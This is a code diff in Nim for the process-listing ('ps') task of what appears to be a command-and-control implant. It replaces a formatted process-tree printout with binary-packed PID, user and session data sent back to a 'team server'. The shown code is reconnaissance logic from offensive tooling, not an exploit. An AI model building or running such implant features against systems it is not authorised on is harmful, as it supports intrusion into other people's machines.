@@ -41,56 +41,29 @@ when defined(agent):
     import ../agent/utils/io
     import ../agent/protocol/result
     import ../agent/core/process
+    import ../common/serialize
 
     proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
-        
+    
         print "   [>] Listing running processes."
         
         try: 
-            var processes: seq[DWORD] = @[]
-            var output: string = ""
+            var processes: string = ""            
+            var packer = Packer.init() 
 
-            var procMap = processList() 
-
-            # Create child-parent process relationships
-            for pid, procInfo in procMap.mpairs():
-                if procMap.contains(procInfo.ppid) and procInfo.ppid != 0:
-                    procMap[procInfo.ppid].children.add(pid)
-                else: 
-                    processes.add(pid)
-
-            # Add header row
-            let headers = @[
-                protect("PID"), 
-                protect("PPID"), 
-                protect("Process"), 
-                protect("Session"), 
-                protect("User context")
-            ]
+            let procList = processList() 
             
-            output &= fmt"{headers[0]:<10}{headers[1]:<10}{headers[2]:<40}{headers[3]:<10}{headers[4]}" & "\n"
-            output &= "-".repeat(len(headers[0])).alignLeft(10) & "-".repeat(len(headers[1])).alignLeft(10) & "-".repeat(len(headers[2])).alignLeft(40) & "-".repeat(len(headers[3])).alignLeft(10) & "-".repeat(len(headers[4])) & "\n"
+            # Add process data to send to the team server
+            packer.add(cast[uint32](procList.len()))    
+            for procInfo in procList: 
+                packer
+                    .add(cast[uint32](procInfo.pid))                            # [PID]: 4 bytes 
+                    .add(cast[uint32](procInfo.ppid))                           # [PPID]: 4 bytes 
+                    .addDataWithLengthPrefix(string.toBytes(procInfo.name))     # [Process name]: Variable 
+                    .addDataWithLengthPrefix(string.toBytes(procInfo.user))     # [Process user]: Variable
+                    .add(cast[uint32](procInfo.session))                        # [Session]: 4 bytes
 
-            # Format and print process
-            proc printProcess(pid: DWORD, indentSpaces: int = 0) = 
-                if not procMap.contains(pid): 
-                    return
-                
-                var process = procMap[pid]
-                let processName = " ".repeat(indentSpaces) & process.name
-                output &= fmt"{$process.pid:<10}{$process.ppid:<10}{processName:<40}{$process.session:<10}{process.user}" & "\n"
-                
-                # Recursively print child processes with indentation
-                process.children.sort()
-                for childPid in process.children:
-                    printProcess(childPid, indentSpaces + 2)
-            
-            # Iterate over root processes to construct the output
-            processes.sort()
-            for pid in processes: 
-                printProcess(pid)
-
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_PROCESSES, packer.pack())
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
